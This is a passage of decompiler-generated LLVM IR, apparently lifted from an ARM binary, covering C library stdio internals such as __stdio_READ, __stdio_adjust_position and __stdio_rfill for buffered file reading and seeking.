  %v1_2d9dc = icmp slt i32 %v3_2d9d8, 0
  br i1 %v1_2d9dc, label %dec_label_pc_2da30, label %dec_label_pc_2d9d0.dec_label_pc_2d9e4_crit_edge

dec_label_pc_2d9d0.dec_label_pc_2d9e4_crit_edge:  ; preds = %dec_label_pc_2d9d0
  %v0_2d9e4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_2d9e4

dec_label_pc_2d9e4:                               ; preds = %dec_label_pc_2d9d0.dec_label_pc_2d9e4_crit_edge, %dec_label_pc_2d9c8
  %v0_2d9e4 = phi i32 [ %v0_2d9e4.pre, %dec_label_pc_2d9d0.dec_label_pc_2d9e4_crit_edge ], [ %v0_2d9c8, %dec_label_pc_2d9c8 ]
  store i32 %v0_2d9e4, i32* %r2.global-to-local, align 4
  %v0_2d9e8 = load i32, i32* @r7, align 4
  store i32 %v2_2d908, i32* %r1.global-to-local, align 4
  %v4_2d9f0 = call i32 @__stdio_seek(i32 %v0_2d9e8, i32* nonnull %stack_var_-40, i32 %v0_2d9e4)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2d9f4 = icmp slt i32 %v4_2d9f0, 0
  br i1 %v1_2d9f4, label %dec_label_pc_2da30, label %dec_label_pc_2d9fc

dec_label_pc_2d9fc:                               ; preds = %dec_label_pc_2d9e4
  %v0_2d9fc = load i32, i32* @r7, align 4
  %v1_2d9fc = inttoptr i32 %v0_2d9fc to i16*
  %v2_2d9fc = load i16, i16* %v1_2d9fc, align 2
  %v3_2d9fc = zext i16 %v2_2d9fc to i32
  store i32 %v3_2d9fc, i32* %r3.global-to-local, align 4
  %v1_2da00 = add i32 %v0_2d9fc, 8
  %v2_2da00 = inttoptr i32 %v1_2da00 to i32*
  %v3_2da00 = load i32, i32* %v2_2da00, align 4
  store i32 %v3_2da00, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_2da08 = and i32 %v3_2d9fc, 65464
  store i32 %v1_2da08, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_2da10 = trunc i32 %v1_2da08 to i16
  store i16 %v1_2da10, i16* %v1_2d9fc, align 2
  %v0_2da14 = load i32, i32* %r2.global-to-local, align 4
  %v1_2da14 = load i32, i32* @r7, align 4
  %v2_2da14 = add i32 %v1_2da14, 28
  %v3_2da14 = inttoptr i32 %v2_2da14 to i32*
  store i32 %v0_2da14, i32* %v3_2da14, align 4
  %v0_2da18 = load i32, i32* %r2.global-to-local, align 4
  %v1_2da18 = load i32, i32* @r7, align 4
  %v2_2da18 = add i32 %v1_2da18, 16
  %v3_2da18 = inttoptr i32 %v2_2da18 to i32*
  store i32 %v0_2da18, i32* %v3_2da18, align 4
  %v0_2da1c = load i32, i32* %r2.global-to-local, align 4
  %v1_2da1c = load i32, i32* @r7, align 4
  %v2_2da1c = add i32 %v1_2da1c, 20
  %v3_2da1c = inttoptr i32 %v2_2da1c to i32*
  store i32 %v0_2da1c, i32* %v3_2da1c, align 4
  %v0_2da20 = load i32, i32* %r2.global-to-local, align 4
  %v1_2da20 = load i32, i32* @r7, align 4
  %v2_2da20 = add i32 %v1_2da20, 24
  %v3_2da20 = inttoptr i32 %v2_2da20 to i32*
  store i32 %v0_2da20, i32* %v3_2da20, align 4
  %v0_2da24 = load i32, i32* %r1.global-to-local, align 4
  %v1_2da24 = load i32, i32* @r7, align 4
  %v2_2da24 = add i32 %v1_2da24, 44
  %v3_2da24 = inttoptr i32 %v2_2da24 to i32*
  store i32 %v0_2da24, i32* %v3_2da24, align 4
  %v0_2da28 = load i32, i32* %r1.global-to-local, align 4
  %v1_2da28 = trunc i32 %v0_2da28 to i8
  %v2_2da28 = load i32, i32* @r7, align 4
  %v3_2da28 = add i32 %v2_2da28, 2
  %v4_2da28 = inttoptr i32 %v3_2da28 to i8*
  store i8 %v1_2da28, i8* %v4_2da28, align 1
  br label %dec_label_pc_2da34

dec_label_pc_2da30:                               ; preds = %dec_label_pc_2d9b8, %dec_label_pc_2d9e4, %dec_label_pc_2d9d0
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2da34

dec_label_pc_2da34:                               ; preds = %dec_label_pc_2d9fc, %dec_label_pc_2da30
  %v0_2da34 = load i32, i32* %r8.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2da34 = icmp eq i32 %v0_2da34, 0
  br i1 %v2_2da34, label %dec_label_pc_2da3c, label %dec_label_pc_2dab0

dec_label_pc_2da3c:                               ; preds = %dec_label_pc_2da34
  %v0_2da3c = load i32, i32* @r7, align 4
  %v1_2da3c = add i32 %v0_2da3c, 60
  %v2_2da3c = inttoptr i32 %v1_2da3c to i32*
  %v3_2da3c = load i32, i32* %v2_2da3c, align 4
  %v1_2da40 = add i32 %v3_2da3c, -1
  store i32 %v1_2da40, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2da44 = icmp eq i32 %v1_2da40, 0
  store i32 %v1_2da40, i32* %v2_2da3c, align 4
  br i1 %v2_2da44, label %dec_label_pc_2da50, label %dec_label_pc_2dab0

dec_label_pc_2da50:                               ; preds = %dec_label_pc_2da3c
  %v0_2da50 = load i32, i32* %r3.global-to-local, align 4
  %v1_2da50 = load i32, i32* @r7, align 4
  %v2_2da50 = add i32 %v1_2da50, 64
  %v3_2da50 = inttoptr i32 %v2_2da50 to i32*
  store i32 %v0_2da50, i32* %v3_2da50, align 4
  %v0_2da54 = load i32, i32* @r7, align 4
  %v1_2da54 = add i32 %v0_2da54, 56
  store i32 %v1_2da54, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2da58

dec_label_pc_2da58:                               ; preds = %dec_label_pc_2da88.dec_label_pc_2da58_crit_edge, %dec_label_pc_2da50
  %v0_2da60 = phi i32 [ %v0_2da60.pre, %dec_label_pc_2da88.dec_label_pc_2da58_crit_edge ], [ %v1_2da54, %dec_label_pc_2da50 ]
  %v0_2da58 = phi i32 [ %v0_2da58.pre, %dec_label_pc_2da88.dec_label_pc_2da58_crit_edge ], [ %v0_2da54, %dec_label_pc_2da50 ]
  %v1_2da58 = add i32 %v0_2da58, 56
  %v2_2da58 = inttoptr i32 %v1_2da58 to i32*
  %v3_2da58 = load i32, i32* %v2_2da58, align 4
  store i32 %v3_2da58, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2da60, i32* %r2.global-to-local, align 4
  %v1_2da6425 = inttoptr i32 %v0_2da60 to i32*
  %v2_2da6426 = load i32, i32* %v1_2da6425, align 4
  store i32 %v2_2da6426, i32* %r3.global-to-local, align 4
  %v3_2da6828 = icmp uge i32 %v2_2da6426, %v3_2da58
  store i1 %v3_2da6828, i1* %cpsr_c.global-to-local, align 1
  %v9_2da6834 = icmp eq i32 %v2_2da6426, %v3_2da58
  br i1 %v9_2da6834, label %dec_label_pc_2da70, label %dec_label_pc_2da88

dec_label_pc_2da70:                               ; preds = %dec_label_pc_2da58, %dec_label_pc_2da70.dec_label_pc_2da64_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2da80 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2da80, label %dec_label_pc_2da84, label %dec_label_pc_2da70.dec_label_pc_2da64_crit_edge

dec_label_pc_2da70.dec_label_pc_2da64_crit_edge:  ; preds = %dec_label_pc_2da70
  %v0_2da64.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2da68.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2da64 = inttoptr i32 %v0_2da64.pre to i32*
  %v2_2da64 = load i32, i32* %v1_2da64, align 4
  store i32 %v2_2da64, i32* %r3.global-to-local, align 4
  %v3_2da68 = icmp uge i32 %v2_2da64, %v1_2da68.pre
  store i1 %v3_2da68, i1* %cpsr_c.global-to-local, align 1
  %v9_2da68 = icmp eq i32 %v2_2da64, %v1_2da68.pre
  br i1 %v9_2da68, label %dec_label_pc_2da70, label %dec_label_pc_2da88

dec_label_pc_2da84:                               ; preds = %dec_label_pc_2da70
  %v0_2da84 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2da84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2da88

dec_label_pc_2da88:                               ; preds = %dec_label_pc_2da58, %dec_label_pc_2da70.dec_label_pc_2da64_crit_edge, %dec_label_pc_2da84
  %v0_2da90 = phi i32 [ %v0_2da84, %dec_label_pc_2da84 ], [ %v2_2da6426, %dec_label_pc_2da58 ], [ %v2_2da64, %dec_label_pc_2da70.dec_label_pc_2da64_crit_edge ]
  %v1_2da88 = phi i32 [ %v0_2da84, %dec_label_pc_2da84 ], [ %v3_2da58, %dec_label_pc_2da58 ], [ %v1_2da68.pre, %dec_label_pc_2da70.dec_label_pc_2da64_crit_edge ]
  %v3_2da88 = icmp uge i32 %v0_2da90, %v1_2da88
  store i1 %v3_2da88, i1* %cpsr_c.global-to-local, align 1
  %v9_2da88 = icmp eq i32 %v0_2da90, %v1_2da88
  br i1 %v9_2da88, label %dec_label_pc_2da90, label %dec_label_pc_2da88.dec_label_pc_2da58_crit_edge

dec_label_pc_2da88.dec_label_pc_2da58_crit_edge:  ; preds = %dec_label_pc_2da88
  %v0_2da58.pre = load i32, i32* @r7, align 4
  %v0_2da60.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2da58

dec_label_pc_2da90:                               ; preds = %dec_label_pc_2da88
  %v2_2da90 = icmp ne i32 %v1_2da88, 0
  store i1 %v2_2da90, i1* %cpsr_c.global-to-local, align 1
  %v7_2da94 = icmp slt i32 %v1_2da88, 2
  br i1 %v7_2da94, label %dec_label_pc_2dab0, label %dec_label_pc_2da98

dec_label_pc_2da98:                               ; preds = %dec_label_pc_2da90
  %v0_2da9c = load i32, i32* %r1.global-to-local, align 4
  %v1_2da9c = add i32 %v0_2da9c, 129
  store i32 %v1_2da9c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2dab0

dec_label_pc_2dab0:                               ; preds = %dec_label_pc_2da3c, %dec_label_pc_2da34, %dec_label_pc_2da98, %dec_label_pc_2da90, %dec_label_pc_2d91c
  %v0_2dab0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v3_2d904, i32* @r4, align 4
  store i32 %v6_2d904, i32* @r5, align 4
  store i32 %v12_2d904, i32* @r7, align 4
  ret i32 %v0_2dab0

; uselistorder directives
  uselistorder i32 %v0_2da84, { 1, 0, 2 }
  uselistorder i32 %v1_2da68.pre, { 0, 2, 1 }
  uselistorder i32 %v0_2d9e4, { 1, 0 }
  uselistorder i32 %v0_2d9c8, { 0, 2, 1 }
  uselistorder i32 %v1_2d970.pre, { 1, 0 }
  uselistorder i32 %v2_2d908, { 0, 2, 1 }
  uselistorder i32 %tmp18, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1, 15, 16 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1, 15, 16, 17 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 46, 47, 48, 44, 45, 49, 50, 51 }
  uselistorder i32 -61441, { 40, 41, 28, 29, 30, 31, 32, 33, 24, 25, 26, 27, 34, 35, 16, 17, 36, 37, 38, 39, 18, 19, 20, 21, 22, 23, 0, 5, 6, 7, 8, 9, 10, 44, 2, 3, 11, 12, 13, 14, 15, 1, 42, 43, 4 }
  uselistorder label %dec_label_pc_2dab0, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_2da88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2da70, { 1, 0 }
  uselistorder label %dec_label_pc_2da34, { 1, 0 }
  uselistorder label %dec_label_pc_2da30, { 1, 2, 0 }
  uselistorder label %dec_label_pc_2d9ac, { 1, 0 }
  uselistorder label %dec_label_pc_2d9a0, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_2d990, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2d978, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_2dac4 = load i32, i32* @r4, align 4
  store i32 %v3_2dac4, i32* %stack_var_-12, align 4
  %v0_2dac8 = load i32, i32* %r0.global-to-local, align 4
  %v1_2dac8 = inttoptr i32 %v0_2dac8 to i16*
  %v2_2dac8 = load i16, i16* %v1_2dac8, align 2
  %v3_2dac8 = zext i16 %v2_2dac8 to i32
  store i32 %v3_2dac8, i32* @r3, align 4
  %v1_2dacc = and i32 %v3_2dac8, 4
  store i32 %v1_2dacc, i32* @r5, align 4
  %v2_2dacc = icmp eq i32 %v1_2dacc, 0
  store i32 %v0_2dac8, i32* @r4, align 4
  br i1 %v2_2dacc, label %dec_label_pc_2dae0, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_2dae0:                               ; preds = %entry
  %v1_2dae0 = icmp slt i32 %arg2, 0
  br i1 %v1_2dae0, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_2dae0
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_2dae0, %bb18
  %v1_2dae8 = add i32 %v0_2dac8, 4
  %v2_2dae8 = inttoptr i32 %v1_2dae8 to i32*
  %v3_2dae8 = load i32, i32* %v2_2dae8, align 4
  store i32 %v3_2dae8, i32* %r0.global-to-local, align 4
  %v1_2daec = call i32 @__libc_read(i32 %v3_2dae8)
  store i32 %v1_2daec, i32* %r0.global-to-local, align 4
  %v5_2daf4 = icmp sgt i32 %v1_2daec, 0
  br i1 %v5_2daf4, label %.thread7, label %dec_label_pc_2daf8

dec_label_pc_2daf8:                               ; preds = %bb19
  %v2_2daf0 = icmp eq i32 %v1_2daec, 0
  %v0_2daf8 = load i32, i32* @r4, align 4
  %v1_2daf8 = inttoptr i32 %v0_2daf8 to i16*
  %v2_2daf8 = load i16, i16* %v1_2daf8, align 2
  br i1 %v2_2daf0, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_2daf8
  %v2_2dafc = or i16 %v2_2daf8, 4
  store i16 %v2_2dafc, i16* %v1_2daf8, align 2
  %v1_2db18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_2daf8
  %v2_2db00 = or i16 %v2_2daf8, 8
  store i16 %v2_2db00, i16* %v1_2daf8, align 2
  %v1_2db0c = load i32, i32* @r5, align 4
  store i32 %v1_2db0c, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_2db18 = phi i32 [ %v1_2db18.pre, %bb20 ], [ 0, %bb ], [ %v1_2daec, %bb19 ], [ %v1_2db0c, %bb21 ]
  %v2_2db14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2db14, i32* @r4, align 4
  ret i32 %v1_2db18

; uselistorder directives
  uselistorder i16 %v2_2daf8, { 1, 0 }
  uselistorder i32 %v1_2daec, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder i32 2147483647, { 6, 0, 1, 7, 2, 5, 3, 4 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_2db1c = load i32, i32* @r4, align 4
  store i32 %v3_2db1c, i32* %stack_var_-12, align 4
  %v3_2db20 = load i16, i16* %arg1, align 2
  %v4_2db20 = zext i16 %v3_2db20 to i32
  store i32 %v4_2db20, i32* @ip, align 4
  %tmp16 = urem i16 %v3_2db20, 4
  %v1_2db24 = zext i16 %tmp16 to i32
  store i32 %v1_2db24, i32* %r2.global-to-local, align 4
  %v2_2db24 = icmp eq i16 %tmp16, 0
  br i1 %v2_2db24, label %bb, label %dec_label_pc_2db34

bb:                                               ; preds = %entry
  br label %bb13

dec_label_pc_2db34:                               ; preds = %entry
  %v1_2db34 = add nsw i32 %v1_2db24, -1
  %v7_2db34 = icmp eq i16 %tmp16, 1
  br i1 %v7_2db34, label %bb13, label %dec_label_pc_2db3c

dec_label_pc_2db3c:                               ; preds = %dec_label_pc_2db34
  %v1_2db3c = and i32 %v4_2db20, 2048
  %v2_2db3c = icmp eq i32 %v1_2db3c, 0
  br i1 %v2_2db3c, label %bb13, label %dec_label_pc_2db44

dec_label_pc_2db44:                               ; preds = %dec_label_pc_2db3c
  %v7_2db44 = icmp eq i32 %v1_2db34, 2
  br i1 %v7_2db44, label %dec_label_pc_2dbd0, label %dec_label_pc_2db4c

dec_label_pc_2db4c:                               ; preds = %dec_label_pc_2db44
  %v2_2db4c = add i32 %tmp, 40
  %v3_2db4c = inttoptr i32 %v2_2db4c to i32*
  %v4_2db4c = load i32, i32* %v3_2db4c, align 4
  store i32 %v4_2db4c, i32* %r3.global-to-local, align 4
  %v2_2db50 = icmp eq i32 %v4_2db4c, 0
  br i1 %v2_2db50, label %dec_label_pc_2db58, label %dec_label_pc_2dbd0

dec_label_pc_2db58:                               ; preds = %dec_label_pc_2db4c
  %v2_2db58 = add i32 %tmp, 44
  %v3_2db58 = inttoptr i32 %v2_2db58 to i32*
  %v4_2db58 = load i32, i32* %v3_2db58, align 4
  store i32 %v4_2db58, i32* %r3.global-to-local, align 4
  %v2_2db5c = add i32 %tmp, 3
  %v3_2db5c = inttoptr i32 %v2_2db5c to i8*
  %v4_2db5c = load i8, i8* %v3_2db5c, align 1
  %v5_2db5c = zext i8 %v4_2db5c to i32
  store i32 %v5_2db5c, i32* %r2.global-to-local, align 4
  %v2_2db60 = icmp eq i32 %v4_2db58, 0
  br i1 %v2_2db60, label %.thread1, label %bb12

.thread1:                                         ; preds = %dec_label_pc_2db58
  %v1_2db683 = sub nsw i32 0, %v5_2db5c
  br label %bb13

bb12:                                             ; preds = %dec_label_pc_2db58
  %v3_2db64 = add i32 %tmp, 2
  %v4_2db64 = inttoptr i32 %v3_2db64 to i8*
  %v5_2db64 = load i8, i8* %v4_2db64, align 1
  %v6_2db64 = zext i8 %v5_2db64 to i32
  store i32 %v6_2db64, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_2db64, %v5_2db5c
  %v3_2db6c = sub nsw i32 0, %sum
  br label %bb13

bb13:                                             ; preds = %bb, %.thread1, %dec_label_pc_2db3c, %dec_label_pc_2db34, %bb12
  %v1_2db80 = phi i32 [ %v1_2db683, %.thread1 ], [ %v1_2db34, %dec_label_pc_2db3c ], [ %v1_2db34, %dec_label_pc_2db34 ], [ 0, %bb ], [ %v3_2db6c, %bb12 ]
  %v1_2db70 = and i32 %v4_2db20, 64
  %v2_2db70 = icmp eq i32 %v1_2db70, 0
  %v2_2db74 = add i32 %tmp, 16
  %v3_2db74 = inttoptr i32 %v2_2db74 to i32*
  %v4_2db74 = load i32, i32* %v3_2db74, align 4
  store i32 %v4_2db74, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_2db70, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_2db80 = sub i32 %v1_2db80, %v4_2db74
  store i32 %v2_2db80, i32* %r3.global-to-local, align 4
  %v1_2db84 = inttoptr i32 %arg2 to i32*
  %v2_2db84 = load i32, i32* %v1_2db84, align 4
  store i32 %v2_2db84, i32* %r0.global-to-local, align 4
  %v3_2db84 = add i32 %arg2, 4
  %v4_2db84 = inttoptr i32 %v3_2db84 to i32*
  %v5_2db84 = load i32, i32* %v4_2db84, align 4
  %v2_2db88 = add i32 %storemerge, %v2_2db80
  store i32 %v2_2db88, i32* %r4.global-to-local, align 4
  %v2_2db8c = sub i32 %v2_2db84, %v2_2db88
  store i32 %v2_2db8c, i32* %r2.global-to-local, align 4
  %v2_2db90 = and i32 %v2_2db88, 1073741824
  %v3_2db90 = icmp ne i32 %v2_2db90, 0
  %v4_2db90 = ashr i32 %v2_2db88, 31
  %v6_2db90 = icmp eq i1 %v3_2db90, false
  %v7_2db90 = sub i32 %v5_2db84, %v4_2db90
  %v9_2db90 = sext i1 %v6_2db90 to i32
  %v10_2db90 = add i32 %v7_2db90, %v9_2db90
  store i32 %v10_2db90, i32* %r3.global-to-local, align 4
  %v2_2db94 = sub i32 %v10_2db90, %v5_2db84
  %v4_2db94 = xor i32 %v10_2db90, %v5_2db84
  %v5_2db94 = xor i32 %v2_2db94, %v10_2db90
  %v6_2db94 = and i32 %v5_2db94, %v4_2db94
  %v7_2db94 = icmp slt i32 %v6_2db94, 0
  %v8_2db94 = icmp slt i32 %v2_2db94, 0
  %v9_2db94 = icmp eq i32 %v10_2db90, %v5_2db84
  store i32 %v2_2db8c, i32* %v1_2db84, align 4
  %v5_2db98 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_2db98, i32* %v4_2db84, align 4
  %v3_2db9c = xor i1 %v8_2db94, %v7_2db94
  %v4_2db9c = or i1 %v9_2db94, %v3_2db9c
  br i1 %v4_2db9c, label %dec_label_pc_2dba0, label %dec_label_pc_2dbac

dec_label_pc_2dba0:                               ; preds = %bb13
  br i1 %v9_2db94, label %dec_label_pc_2dba4, label %dec_label_pc_2dbb0thread-pre-split

dec_label_pc_2dba4:                               ; preds = %dec_label_pc_2dba0
  %v0_2dba4 = load i32, i32* %r2.global-to-local, align 4
  %v1_2dba4 = load i32, i32* %r0.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v0_2dba4, %v1_2dba4
  br i1 %tmp17, label %dec_label_pc_2dbac, label %dec_label_pc_2dbb0thread-pre-split

dec_label_pc_2dbac:                               ; preds = %dec_label_pc_2dba4, %bb13
  %v0_2dbac = load i32, i32* %r4.global-to-local, align 4
  %v1_2dbac = sub i32 0, %v0_2dbac
  store i32 %v1_2dbac, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2dbb0

dec_label_pc_2dbb0thread-pre-split:               ; preds = %dec_label_pc_2dba4, %dec_label_pc_2dba0
  %v0_2dbb0.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2dbb0

dec_label_pc_2dbb0:                               ; preds = %dec_label_pc_2dbb0thread-pre-split, %dec_label_pc_2dbac
  %v0_2dbb0 = phi i32 [ %v0_2dbb0.pr, %dec_label_pc_2dbb0thread-pre-split ], [ %v1_2dbac, %dec_label_pc_2dbac ]
  %v1_2dbb0 = icmp slt i32 %v0_2dbb0, 0
  br i1 %v1_2dbb0, label %dec_label_pc_2dbb8, label %dec_label_pc_2dbd4

dec_label_pc_2dbb8:                               ; preds = %dec_label_pc_2dbb0
  store i32 ptrtoint (i32* @global_var_14d6c.3527 to i32), i32* %r3.global-to-local, align 4
  %v0_2dbbc = call i32 @__aeabi_read_tp()
  store i32 %v0_2dbbc, i32* %r0.global-to-local, align 4
  %v3_2dbc0 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2dbc0 = sext i16 %v3_2dbc0 to i32
  store i32 %v4_2dbc0, i32* %r3.global-to-local, align 4
  store i32 75, i32* %r2.global-to-local, align 4
  %v3_2dbc8 = add i32 %v4_2dbc0, %v0_2dbbc
  %v4_2dbc8 = inttoptr i32 %v3_2dbc8 to i32*
  store i32 75, i32* %v4_2dbc8, align 4
  %v0_2dbd4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2dbd4

dec_label_pc_2dbd0:                               ; preds = %dec_label_pc_2db4c, %dec_label_pc_2db44
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2dbd4

dec_label_pc_2dbd4:                               ; preds = %dec_label_pc_2dbb0, %dec_label_pc_2dbb8, %dec_label_pc_2dbd0
  %v0_2dbd4 = phi i32 [ %v0_2dbb0, %dec_label_pc_2dbb0 ], [ %v0_2dbd4.pre, %dec_label_pc_2dbb8 ], [ -1, %dec_label_pc_2dbd0 ]
  store i32 %v0_2dbd4, i32* %r0.global-to-local, align 4
  %v2_2dbd8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2dbd8, i32* @r4, align 4
  ret i32 %v0_2dbd4

; uselistorder directives
  uselistorder i32 %v0_2dbd4, { 1, 0 }
  uselistorder i1 %v9_2db94, { 1, 0 }
  uselistorder i32 %v2_2db94, { 1, 0 }
  uselistorder i32 %v10_2db90, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_2db84, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i32 75, { 0, 2, 1 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_2dbd4, { 2, 1, 0 }
  uselistorder label %bb13, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2dbe4 = load i32, i32* @r4, align 4
  store i32 %v3_2dbe4, i32* %stack_var_-8, align 4
  %v1_2dbe8 = add i32 %arg1, 8
  %v1_2dbec = inttoptr i32 %v1_2dbe8 to i32*
  %v2_2dbec = load i32, i32* %v1_2dbec, align 4
  store i32 %v2_2dbec, i32* @r1, align 4
  %v3_2dbec = add i32 %arg1, 12
  %v4_2dbec = inttoptr i32 %v3_2dbec to i32*
  %v5_2dbec = load i32, i32* %v4_2dbec, align 4
  %v2_2dbf0 = sub i32 %v5_2dbec, %v2_2dbec
  store i32 %v2_2dbf0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_2dbf8 = inttoptr i32 %arg1 to i16*
  %v4_2dbf8 = call i32 @__stdio_READ(i16* %v3_2dbf8, i32 %v2_2dbec, i32 %v2_2dbf0)
  %v0_2dbfc = load i32, i32* @r4, align 4
  %v1_2dbfc = add i32 %v0_2dbfc, 8
  %v2_2dbfc = inttoptr i32 %v1_2dbfc to i32*
  %v3_2dbfc = load i32, i32* %v2_2dbfc, align 4
  store i32 %v3_2dbfc, i32* %r2.global-to-local, align 4
  %v2_2dc00 = add i32 %v3_2dbfc, %v4_2dbf8
  %v2_2dc04 = add i32 %v0_2dbfc, 20
  %v3_2dc04 = inttoptr i32 %v2_2dc04 to i32*
  store i32 %v2_2dc00, i32* %v3_2dc04, align 4
  %v0_2dc08 = load i32, i32* %r2.global-to-local, align 4
  %v1_2dc08 = load i32, i32* @r4, align 4
  %v2_2dc08 = add i32 %v1_2dc08, 16
  %v3_2dc08 = inttoptr i32 %v2_2dc08 to i32*
  store i32 %v0_2dc08, i32* %v3_2dc08, align 4
  %v2_2dc0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2dc0c, i32* @r4, align 4
  ret i32 %v4_2dbf8

; uselistorder directives
  uselistorder i32 %v4_2dbf8, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_2dc14 = load i32, i32* @r4, align 4
  store i32 %v3_2dc14, i32* %stack_var_-12, align 4
  %v0_2dc18 = load i32, i32* @r0, align 4
  %v1_2dc18 = inttoptr i32 %v0_2dc18 to i16*
  %v2_2dc18 = load i16, i16* %v1_2dc18, align 2
  %v3_2dc18 = zext i16 %v2_2dc18 to i32
  store i32 %v3_2dc18, i32* %r3.global-to-local, align 4
  %v0_2dc1c = load i32, i32* @r1, align 4
  %v2_2dc1c = and i32 %v0_2dc1c, %v3_2dc18
  %v4_2dc1c = icmp eq i32 %v2_2dc1c, 0
  store i32 %v0_2dc18, i32* @r4, align 4
  br i1 %v4_2dc1c, label %dec_label_pc_2dc2c, label %dec_label_pc_2dc3c

dec_label_pc_2dc2c:                               ; preds = %entry
  %v1_2dc2c = and i32 %v3_2dc18, 2176
  %v2_2dc2c = icmp eq i32 %v1_2dc2c, 0
